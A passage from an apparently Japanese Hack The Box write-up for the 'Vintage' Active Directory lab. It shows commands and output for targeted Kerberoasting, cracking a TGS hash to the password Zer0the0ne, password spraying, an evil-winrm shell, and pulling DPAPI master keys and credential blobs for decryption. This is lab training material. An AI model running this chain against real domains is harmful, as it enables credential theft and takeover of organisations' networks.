└─$ bloodyAD -d vintage.htb -k ccache='gmsa01$.ccache' --host "dc01.vintage.htb" add groupMember "SERVICEMANAGERS" "gmsa01$"
[+] gmsa01$ added to SERVICEMANAGERS
```

そして、GenericAllを使用して、SERVICEMANAGERSに入っているすべてのユーザーのパスワードを取得する
ここでは、ユーザーのパスワードを取得するために、Target Kerberoast攻撃を行う
また、その前に、SVC_SQLアカウントはアカウントが無効化されているため、有効化する

ccacheの設定
```sh
export KRB5CCNAME="$PWD/gmsa01$.ccache"
klist 
```

**SVC_SQLアカウントの有効化**
```sh
──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ bloodyAD -d vintage.htb -k --host dc01.vintage.htb -u 'GMSA01$' -p 6fa8a70cfb333b7f68e3f0d94b247f68 -f rc4 remove uac svc_sql -f ACCOUNTDISABLE
[-] ['ACCOUNTDISABLE'] property flags removed from svc_sql's userAccountControl

```

それぞれのアカウントに対して、**Target Kerberoast攻撃**を行い、TGSを取得する
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ KRB5CCNAME=gmsa01\$.ccache python targetedKerberoast.py -d vintage.htb -k --no-pass --dc-host dc01.vintage.htb
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (svc_sql)
$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$73d2756351251f3c2b06d7eb0a583ede$413cd1a7d158e030dd21329b5a6d25b81096df7742fe9884562525402235610f9e035883544351c3a848cd6705001ef27774703b29659a31d3e57f017d7449d44b09ca425d962670384137af03d28a37a27aaa615b5a090fb5bdab4fc6dc85997ea8f4960114a227feb7c846ba21865e0752d093f3ec92030b8b0ca0db51de6d5e0825918b3dd0b4faf7b8bc09807e10cc90c1425d7293ee21528b830922f5fb815b8665b2db739f51b8bb855832d4e4c48a4a25740e3c3fdf82dceed93bedc7c5e7f205f794ea00e1662853a9f9825ee6e62ba32bc6b98d5e5a0351541d358e4e5ef58a2189cffdd509428ff3f43faf4376a22ff4dea4b088845821f3e5935f92d44a40839a99b7ffc1543cc301e2416bab51a29c2bca5b7ba806919aa38da56707f7f05334f2ccf5e96a59e1fcdbb70fa7094bf60ce94d64623e255c09c2126c8c6e521ee0bfb4b4e55fab2e7cc1b0781ced3321c4ab287a68bef80670ca2cb028447659e91b7219de0538268aacc69da6ec0d9c41dfc4eaa378f7eeb2a3849c59193cc00462bca9307726ba1cbd1948327f792724dba2022c20ec1b942dc98037b8e595b8addae4f12478fcd1603e4e21428088df34ea5b2c8f0527f5befd19c4453be18f6336f8a8e515344b2aa81474f8333e7830657643ae11eac5822f72b264966d6b65e164823a86ebd07176792d853f414e7494cc240638ebefedf8061ff464d449151519ed22fd0ef61499999bdb21ba526df00d5c39a048b2fc74c4a693f5a0a8802e7fe57ff254c75fd61f0991b20b9fb94c7161a26e49c31aecb2d3a6194f06389baaa08be03874c8f6f4a5374473caaca0eeba4f50386557002979c6876312f74d945a208841db3016263d13075426a2b8d60f2e8c4249329284384c8a40e0fda976d5368f4a1d2ae8fbe3a926cbaa5be946d13dc4cb202ed6eba5a108d27cd15d0dae0fb7a95f35a6f89d1f5a25826bbae56cc179754b3989b3d0e7d2ddf395b84c2aa3cc7b507adf2e83f53f4ab589c14a30972c588cded86da4b855248b3bfad6d6dbec010e85be837b1f48cc2559ff8c7e1fa376385e226999eb1247af5a8988747f1b4d813a31238445bc0d1c9b6338750852a6420df395052d51ebe6a9c7ba8ed82f620ce09ac8bb3820286d581c5a7496f287809a3e3aa4acb02120100ac2907f29a37f54581a6576fc43faa6791603139ed75f3953a1105cd58845582fa212cd3bf680cd5091a9ee4eda9396d807d8224275fef92943b840268a4bb8c07bdcb7a7dbaf4c296b4c9ad2ef786ae0095eb50dcccce3388590e9a28a97d02c734eae037b1947b560bf816ee981f60e1dcc5cdd02f954074ea617f442fce093f45f774d8476bea7e995d15fff617c1cd6421d28d456c97fd1740ff784fa7d84545f72f53e0a89299981e50aeb603842a0c2c24b39c2c5393b8f72
[+] Printing hash for (svc_ldap)
$krb5tgs$23$*svc_ldap$VINTAGE.HTB$vintage.htb/svc_ldap*$4f52b1f959dfee999cd9beae4ad0129e$7114cfdeb21f67c05e7b179536404a80d0c01b2f9708c84a97c7ffc606d992c616fa5ee4674a9d9d1959d8fe2ec4c9c3e00d66059884b13e71af58506cbbb2e2b046e70b9962c92b829104d2ac50148f7438dd060449400f320f6c51e623ccfb51fd93fc5ac7637436cd124aa5e031a42292f543b23921e92a5bfc5f40bdbae5a2ba9a57cd88b64653df4aa8f1f96b0f467228de32adb51d5e13b1e44042ad1f6f72cc988fa173ccf02833846774b43a3b299b65f81d1674601f7bce8b426c69f3df522bc7b2640e301e952bf4595233523c41b4c50de0965f625eef892aaa27e1fa3ddf7c989ef2976290c5b09f0adf6addbcacbd404d3e5208e799687fe033a8bbca37510893751073de92cb8f1f01cdf4db539598cd9811d0b1abc75e2c6822bc6b1b1c8e102906fea1f602bdceb64b0b39a59c5263fa129488afdd0e091cefc834ad33190017cc4ef9bacbf544b14614e6062a1f5b02d5e6aa4d856de97814fae81fa0901b2184d0d7565578ca19a085eefd38841961a93717434078e4339d82d40e603f37abe916952315d638fcc92bce183ddcc5a2ca1097305b2db30b893d5692e8774a2b4d6c825a34b87f982e70a75f85575e9a0270143c81cd420d055b3580d5beab0cb08d2b1f6be6ba6530183c2ae2aa2b0da31e575152c3a1302fb85d59f29028b46c118581cc9a8bc3e3172164d3ff4428f114d85a726c5708ffaeb5a3ab4fb1cf586f6aa6f3d59e03fb7a4b5630533db6c4be98e1cb63c957522021025185c49bb9ba6b16c81394089b81575c52b5010e1e571e12074f50d741d0cca70592dd9027a2890071277f5ec3bc719e0c753e59e98ea86e4e50c715296105d002fab6184c0f715354081570858979bad0f69ce31e7c23bb8840ed6d49bdfaf81c4f5000791c7acb76b00e5e80e8543ef0837fdd21cdf47ce000ab92718d72e8be5e5b5b40e6e5a6f360f2f3c0bca268a0b8ee0e4ddaf0f966dd78cf766c2cfbe97ea1cab533cadbf963bf2b69c3154382b95e5bad01b7a544e0b80cdd9c75f7edd5542039e4c359988b0c416043fcbd5f99023178cb259fe1d471e47edd68a7b9ab13a28b26b6442c27249b2c711a979916ea7a53d11b60adb58ea89e0c459d50e0a6532116db09d7c8c02bca1389e653392407432c56ae6b453bdfe97070e55bf88d8584959d591a17ee12e77ed7b3fdba53f1b892e50a5295f93f86e2fc9345a1d9e390dd158d59664fa9d84f6f6ec688a25030623d60ab57a44c1c0591c412e22a1e8a687918a57f0ff0cb3b8f6d7e40eb574a809c6282be0f9b1ffdfe4fd728f9a289c02b4015ade877bb1451f96a79d056122ec5037be0d11e43ce88f2c22f5bffce54624d8d0032128187160b9f57724fddbf7d20184a303b46da7a7622a4d83681fa05564a9377a36037182a88f423dc8ce39fc7986023f6fd57bb
[+] Printing hash for (svc_ark)
$krb5tgs$23$*svc_ark$VINTAGE.HTB$vintage.htb/svc_ark*$39b092045a7866809e2333a1c9ce5c20$9a3eb324f266eab41def2d2bba6c940bfe4f84c0e8532bb5b4079566c8794e25523e397683cd011db515b153ff71bbee7e12f535aa4410fc0b30ca604662514dd96f306e55ffd3bdde461c5f3ac2416f60bb042da7f107c95b3d4540cdee1912dd98010a104342de6f315501ef2fe994ae2437b441e42ddcf1d439d43829c7f422d029f5358f4d7575edf918bfc41f211b3dd4951a21b0f3e94130643b47e994637f8a9a65c3de10f5888d9fb6dfcad6845d6e41db9825161115e8837ad0dfc05ff6fa1629c33c389c4fa066ebe5d068c9d95e8347371ee920e7fc9d020dfa5c37990e05932a44b4c49a5784e2926b0cece461df5d1f020518ce6ac8b71524e32b6572450649f7675ae7bee7263175a8cae63e828a6a4a287c67d887557a8589ce1ac0ac78766cd5f13e4922e69e99788b44e75636ba08944e4af8cc48eda87645d015730475cb5ed531a85d4f6bbc3d5d3601b615174f2dce2579853b253cf00da73edaafcd934145e3f22fe58ec62f081514162808ea1494557c82d8f2b0f50c502e8bfe86d0521dc5e8f7db060c573655d923b3c1ba029c499cfb95000fd9c0fc01c9557a0adfb264c634a04ccefe9419905631e6669402454e29e25213ee5ad20d127e63cbf4505d5cac1322689cc26c9804af5a309b359656c01f7a324c8ac6d922e63864005ee08effefe723bacda887edc4c1848846386024341e0fb06f583fd9df014bd65fb581c0d1e51f9d65b9dac0528f654a483c2b021f4224f465a867e40920d2f2969b20134c344d25bc3784330dc6c6525a1d3cca6407e99a6df844ec5690621fe77fe7ac51838f654f82e82d2af437ecee7edf253a7f138a3432c4cd46612c9379719e153d18eeeadaf596ee69389f78fa6cd55c3cddc0ee596ed1f468a136428aae63e00b187d6e46d5b5ebe12303aa12bf9aa61e8efc6bf1377d0c86783adc35afe9e0623d010b37930e7c65ffbfe1b67ef822b94b2537129a9c774f04a83abea2c5d5b6ad38ef05d309763691ea0584fe862b4b5c4f781ec303f775b9ac328a2892c5519bbfeb0466dece8b8f696ed120a044a6d2ee57aec2d94844c3f6860774b930023cb8ae6792d203d97878776d006b231ff565d71e600582221aa1d737057cb0a9ab6ae76f4adeea8f8815de1134b846dfdb5024cf0252488dbb3cdd481925182dde224018736c0eeb4d5283ec6c4bda5c9ef8442dcf517c8a5bb43f451e9c3cdfa699a1dbe0a05981f8ae5f18a67bcd8b2fd8627d97704665048c56ddc14c2bb59c264a63930f4301da4e608b860475b2c903d03e5c91d1b99be4688cb5f9157d92c5e1682b134fcfd22cc46689dafdf63dbbe776c81f63ba7d1af462ffee583af93845744bf73cd24fc7604b34dd1764bf79d85a5971470be134421f1fb1e1222f7d1a6a41e9bb8be7352fcf7df7976b6357b33ffc55

```

hashcatを使って、**TGSをクラック**し、平文の認証情報を取得する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ hashcat hash.txt /usr/share/wordlists/rockyou.txt                                         
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 1435/2935 MB (512 MB allocatable), 6MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

13100 | Kerberos 5, etype 23, TGS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*svc_sql$VINTAGE.HTB$vintage.htb/svc_sql*$73d2756351251f3c2b06d7eb0a583ede$413cd1a7d158e030dd21329b5a6d25b81096df7742fe9884562525402235610f9e035883544351c3a848cd6705001ef27774703b29659a31d3e57f017d7449d44b09ca425d962670384137af03d28a37a27aaa615b5a090fb5bdab4fc6dc85997ea8f4960114a227feb7c846ba21865e0752d093f3ec92030b8b0ca0db51de6d5e0825918b3dd0b4faf7b8bc09807e10cc90c1425d7293ee21528b830922f5fb815b8665b2db739f51b8bb855832d4e4c48a4a25740e3c3fdf82dceed93bedc7c5e7f205f794ea00e1662853a9f9825ee6e62ba32bc6b98d5e5a0351541d358e4e5ef58a2189cffdd509428ff3f43faf4376a22ff4dea4b088845821f3e5935f92d44a40839a99b7ffc1543cc301e2416bab51a29c2bca5b7ba806919aa38da56707f7f05334f2ccf5e96a59e1fcdbb70fa7094bf60ce94d64623e255c09c2126c8c6e521ee0bfb4b4e55fab2e7cc1b0781ced3321c4ab287a68bef80670ca2cb028447659e91b7219de0538268aacc69da6ec0d9c41dfc4eaa378f7eeb2a3849c59193cc00462bca9307726ba1cbd1948327f792724dba2022c20ec1b942dc98037b8e595b8addae4f12478fcd1603e4e21428088df34ea5b2c8f0527f5befd19c4453be18f6336f8a8e515344b2aa81474f8333e7830657643ae11eac5822f72b264966d6b65e164823a86ebd07176792d853f414e7494cc240638ebefedf8061ff464d449151519ed22fd0ef61499999bdb21ba526df00d5c39a048b2fc74c4a693f5a0a8802e7fe57ff254c75fd61f0991b20b9fb94c7161a26e49c31aecb2d3a6194f06389baaa08be03874c8f6f4a5374473caaca0eeba4f50386557002979c6876312f74d945a208841db3016263d13075426a2b8d60f2e8c4249329284384c8a40e0fda976d5368f4a1d2ae8fbe3a926cbaa5be946d13dc4cb202ed6eba5a108d27cd15d0dae0fb7a95f35a6f89d1f5a25826bbae56cc179754b3989b3d0e7d2ddf395b84c2aa3cc7b507adf2e83f53f4ab589c14a30972c588cded86da4b855248b3bfad6d6dbec010e85be837b1f48cc2559ff8c7e1fa376385e226999eb1247af5a8988747f1b4d813a31238445bc0d1c9b6338750852a6420df395052d51ebe6a9c7ba8ed82f620ce09ac8bb3820286d581c5a7496f287809a3e3aa4acb02120100ac2907f29a37f54581a6576fc43faa6791603139ed75f3953a1105cd58845582fa212cd3bf680cd5091a9ee4eda9396d807d8224275fef92943b840268a4bb8c07bdcb7a7dbaf4c296b4c9ad2ef786ae0095eb50dcccce3388590e9a28a97d02c734eae037b1947b560bf816ee981f60e1dcc5cdd02f954074ea617f442fce093f45f774d8476bea7e995d15fff617c1cd6421d28d456c97fd1740ff784fa7d84545f72f53e0a89299981e50aeb603842a0c2c24b39c2c5393b8f72:Zer0the0ne
Approaching final keyspace - workload adjusted.           

                                                          
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: hash.txt
Time.Started.....: Mon Sep  1 08:49:46 2025 (16 secs)
Time.Estimated...: Mon Sep  1 08:50:02 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1776.2 kH/s (0.41ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/3 (33.33%) Digests (total), 1/3 (33.33%) Digests (new), 1/3 (33.33%) Salts
Progress.........: 43033155/43033155 (100.00%)
Rejected.........: 0/43033155 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[212173657879616e67656c2121] -> $HEX[042a0337c2a156616d6f732103]

Started: Mon Sep  1 08:49:43 2025
Stopped: Mon Sep  1 08:50:03 2025

```

svc_sqlのみ、認証情報を取得できた
### svc_sqlの認証情報
svc_sql : Zer0the0ne

## パスワードスプレー攻撃
パスワードスプレー攻撃を行って、svc_sqlと同じパスワードを使いまわしていないかを確認する

まず、**ユーザー一覧を取得**する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ export KRB5CCNAME="$PWD/gmsa01$.ccache"
                                                                                                                                                                               
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ nxc ldap vintage.htb -k --use-kcache --users
LDAP        vintage.htb     389    DC01             [*] None (name:DC01) (domain:vintage.htb)
LDAP        vintage.htb     389    DC01             [+] vintage.htb\gMSA01$ from ccache 
LDAP        vintage.htb     389    DC01             [*] Enumerated 14 domain users: vintage.htb
LDAP        vintage.htb     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        vintage.htb     389    DC01             Administrator                 2024-06-08 04:34:54 0        Built-in account for administering the computer/domain      
LDAP        vintage.htb     389    DC01             Guest                         2024-11-13 06:16:53 1        Built-in account for guest access to the computer/domain    
LDAP        vintage.htb     389    DC01             krbtgt                        2024-06-05 03:27:35 0        Key Distribution Center Service Account                     
LDAP        vintage.htb     389    DC01             M.Rossi                       2024-06-05 06:31:08 1                                            
LDAP        vintage.htb     389    DC01             R.Verdi                       2024-06-05 06:31:08 1                                            
LDAP        vintage.htb     389    DC01             L.Bianchi                     2024-06-05 06:31:08 1                                            
LDAP        vintage.htb     389    DC01             G.Viola                       2024-06-05 06:31:08 1                                            
LDAP        vintage.htb     389    DC01             C.Neri                        2024-06-05 14:08:13 0                                            
LDAP        vintage.htb     389    DC01             P.Rosa                        2024-11-06 04:27:16 0                                            
LDAP        vintage.htb     389    DC01             svc_sql                       2025-09-01 08:52:05 1                                           
LDAP        vintage.htb     389    DC01             svc_ldap                      2024-06-06 06:45:27 1                                            
LDAP        vintage.htb     389    DC01             svc_ark                       2024-06-06 06:45:27 1                                            
LDAP        vintage.htb     389    DC01             C.Neri_adm                    2024-06-07 03:54:14 0                                            
LDAP        vintage.htb     389    DC01             L.Bianchi_adm                 2024-11-26 03:40:30 0     
```

ユーザー一覧をvalid_users.txtに保存
```sh
└─$ cat valid_users.txt
Administrator
Guest
krbtgt
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm

```

**パスワードスプレー攻撃**を実行する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ netexec smb dc01.vintage.htb -u  valid_users.txt -p Zer0the0ne -k --continue-on-success
SMB         dc01.vintage.htb 445    dc01             [*]  x64 (name:dc01) (domain:vintage.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Administrator:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\Guest:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\krbtgt:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\M.Rossi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\R.Verdi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\G.Viola:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [+] vintage.htb\C.Neri:Zer0the0ne 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\P.Rosa:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_sql:Zer0the0ne KDC_ERR_CLIENT_REVOKED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ldap:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\svc_ark:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\C.Neri_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 
SMB         dc01.vintage.htb 445    dc01             [-] vintage.htb\L.Bianchi_adm:Zer0the0ne KDC_ERR_PREAUTH_FAILED 

```

すると、C.Neriアカウントが、svc_awlアカウントの認証情報と同じで、Zer0the0neであることがわかる
### C.Neriの認証情報
C.Neri : Zer0the0ne

そして、C.Neriアカウントは、DC01.VINTAGE.HTBに対して、PSRemoteができる

![](https://i.imgur.com/LaSeSkb.png)



# Privilege Escalation
C.Neriアカウントで、TGTを取得する
```bash
└─$ impacket-getTGT 'vintage.htb/C.Neri:Zer0the0ne' -dc-ip 10.129.231.205
export KRB5CCNAME="$PWD/C.Neri.ccache"
klist
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in C.Neri.ccache
Ticket cache: FILE:/home/kali/Desktop/HTB/machine/Vintage/C.Neri.ccache
Default principal: C.Neri@VINTAGE.HTB

Valid starting     Expires            Service principal
09/01/25 09:23:28  09/01/25 19:23:28  krbtgt/VINTAGE.HTB@VINTAGE.HTB
```

evil-winrmで接続
 - user.txtの取得
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> dir
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> dir


    Directory: C:\Users\C.Neri\Desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          6/7/2024   1:17 PM           2312 Microsoft Edge.lnk
-ar---          9/1/2025   3:59 AM             34 user.txt


*Evil-WinRM* PS C:\Users\C.Neri\Desktop> type user.txt
```

certpyの実行
```bash
certipy-ad find \
  -k -no-pass \
  -dc-host dc01.vintage.htb -dc-ip 10.129.231.205 \
  -ns 10.129.231.205 \
  -ldap-scheme ldap -ldap-port 389 \
  -stdout -vulnerable

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[*] Finding certificate templates
[*] Found 0 certificate templates
[*] Finding certificate authorities
[*] Found 0 certificate authorities
[*] Found 0 enabled certificate templates
[*] Finding issuance policies
[*] Found 1 issuance policy
[*] Found 0 OIDs linked to templates
[*] Enumeration output:
Certificate Authorities                 : [!] Could not find any CAs
Certificate Templates                   : [!] Could not find any certificate templates

```

certpyでは、特に脆弱なものは見つからない

探していると、以下の場所にマスターキーらしきものを見つけた
```bash
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> ls -force
    Directory: C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   1:17 PM            740 4dbf04d8-529b-4b4c-b4ae-8e875e4fe847
-a-hs-          6/7/2024   1:17 PM            740 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
-a-hs-          6/7/2024   1:17 PM            904 BK-VINTAGE
-a-hs-          6/7/2024   1:17 PM             24 Preferred

```

```sh
*Evil-WinRM* PS C:\users\c.neri\appdata\roaming\microsoft\credentials> ls -force


    Directory: C:\users\c.neri\appdata\roaming\microsoft\credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

```

Base64に変換して取得する
- ちなみに、SharpDPAPI.exeを使おうとしても、AVが働いて実行できない
```bash
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847'))
AgAAAAAAAAAAAAAANABkAGIAZgAwADQAZAA4AC0ANQAyADkAYgAtADQAYgA0AGMALQBiADQAYQBlAC0AOABlADgANwA1AGUANABmAGUAOAA0ADcAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA2or8mZsV0QcGzC0XUJ9K8FBGAAAJgAAAA2YAAJhSpSk/CQYorLpjFuO6lxoHg+a9CGghh0pqkMYfO5Irop3dQGYbS2b3KJo0qLO586XfAvV/0dK/fM8a4erXENVlgtsrHRG48O/VO0Egw0qMZld65hY3jxMWTkzfGqfjNK5ytEtwPHGkAgAAAFiAHjGrO47Qhcn7oxZZBrBQRgAACYAAAANmAABRlZY9IPg0gA9TOU3DaFwm1ylSDyf2HHVE2mTqFzwbK7ZHp2XH8Mx2rvk6EpPUtdIv4kkQU6GsO43Xyg+qcks13CkP8uIIo0ECAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwGUQAxdTpQrS3sEc8gVH9tmXllgaPOCz8cyowsRu8fkbCLFyIcsLVGKHQRv3PUJ1qmSeC604xcQlXI43XddWfFZ3tFF1yLQOSNwfbKDdGQiF3yTlYb6KoMvhQXzs1O1LLP2cUEFOGw8+Pg8uMN4KDBURRWfqmRksyn38bg3OKFSQ1K0CpdNzKfPvS6TnGuvHvnglzZdT5qwQ+nOdXFuJccenatjtlVgQNdp6yZOmpQjrkTtZOxz9b0JRsoOQS0NWu7WThQU4s8yeZkHaJRSJ5lohgdYpZiLJ4x1lG5jLz7/IX5pP6UK1cq5KwLjvaMdGsK9GDj3ofoB/OldTS7StCAXHfzvgjmTscAdxSARKV8ekuDWjsXgz7iZkV04lUG5Jo2FD9xrFdY1DqTSbr7oLdHAwzFBQX5RGnDhKFJXA0KJ29sz1zHGVn4/J4k0e/Hkop6YwRfEighbU=
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b'))
AgAAAAAAAAAAAAAAOQA5AGMAZgA0ADEAYQAzAC0AYQA1ADUAMgAtADQAYwBmADcALQBhADgAZAA3AC0AYQBjAGEAMgBkADYAZgA3ADMAMwA5AGIAAAAAAAAAAAAAAAAAiAAAAAAAAABoAAAAAAAAAAAAAAAAAAAAdAEAAAAAAAACAAAA6o788ZIMNhaSpbkSX0mC01BGAAAJgAAAA2YAABAM9ZX6Z/40RYL/aC+dw/D5oa7WMYBN56zwgXYX4QrAIb4DtJoM27zWgMxygJ36SpSHHHQGJMgTs6nZN5U/1q7DBIpQlsWk15jpmUFS2czCScuP9C+dGdYT+p6AWb3L7PZUPqNDHqZRAgAAALFxHXdcOeYbfN6CsYeVaYZQRgAACYAAAANmAABiEtEJeAVpg4QA0lnUzAsf6koPtccl1os9yZrj1gTAc/oSmhBNPEE3/VVVPZw9g3NP26Wj3vO36IOmtsXWYABkukmijrSaAZUCAAAAAAEAAFgAAACn2p9w/uXURbRTVVUG8NTwr2BFf0a0DhdM8JymBww6mzQt8tVsTbDmCZ/uZu3bzOAOUXODaGaJOOKqRm2W8rHPOZ27YjtD1pd0MFJDocNJwdhN5pwTdz2v2JsrVVVE363zZjXHeXefhuL5AMwMQr6gpTsCGcxrd1ziTN9Q1lH9QtnYE7OZlbrZPhiWO2vvdX+UQcKlgpxcSGLaczL53/UJXrvt9hueRn+YXxnK+fiyZ0gmjMlP+yuxOiKSvHM/UT6NmuYewnApQrOBO3A5F1XKHguHKT+VS187uBu/TO1ZT4/CrsKws1aG7EkIXhRKzEgukAwn5nZlU6YaADdeQRDzCR1D0ycJKFyZd4QE1Nt6Kbgr+ukbiurwBJd/D1a3+WWCw+S2OJVHB9qqlcW11heJd+v9eGe1Wf6/PYCvyyWMsvusF8XUswgKQbkH821vscyNmJWDwMply/ZvellKuGQ1/s5gVqUkALQ=
*Evil-WinRM* PS C:\users\c.neri\appdata\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115> [Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\users\c.neri\appdata\roaming\microsoft\credentials\C4BB96844A5C9DD45D5B6A9859252BA6'))     
AQAAAKIBAAAAAAAAAQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAo0HPmVKl90yo16yi1vczmwAAACA6AAAARQBuAHQAZQByAHAAcgBpAHMAZQAgAEMAcgBlAGQAZQBuAHQAaQBhAGwAIABEAGEAdABhAA0ACgAAAANmAADAAAAAEAAAANlsnh9uZhRwM1xc/8CNBwwAAAAABIAAAKAAAAAQAAAAK+zRTF7v+bPA1UScG2CL4uAAAABoyaUl8s/1J1TabkeZkP1VvjzlbcQ61ojdLQpks7Q0/irEKMmlFOJ/Za2o8akFz3kS28HEeNGkg/3kGNOvhVbnZ2NJQHTJ12SgjFuAuPhdS9Ob2CvqW9xu7pDGXPt5AHKqlqRy+fajjcEYkGP0ki6sLBF/rpFnQvRQ9hCg8iVqyq3BpSdwOZ1h0Zxh8mbvDPv+XHw9+o6DabZifdfj+GuMRi+GDNLvv8orYUqHZ6hHO3vB4kDu5T4G8QsIAtULBs3V2ww1G7xdGI57BGKi4LEk6kuaEWopsCflsc5FK4a4xBQAAABSjIrXKMIH3qbzDSrnPMUzCyhkAA==
```

```sh
base64 -d mk1.b64 > mk1.masterkey
base64 -d mk2.b64 > mk2.masterkey
base64 -d cred.b64 > cred.blob

```

マスターキーを復号化する
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Vintage]
└─$ impacket-dpapi masterkey -file mk1.masterkey -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
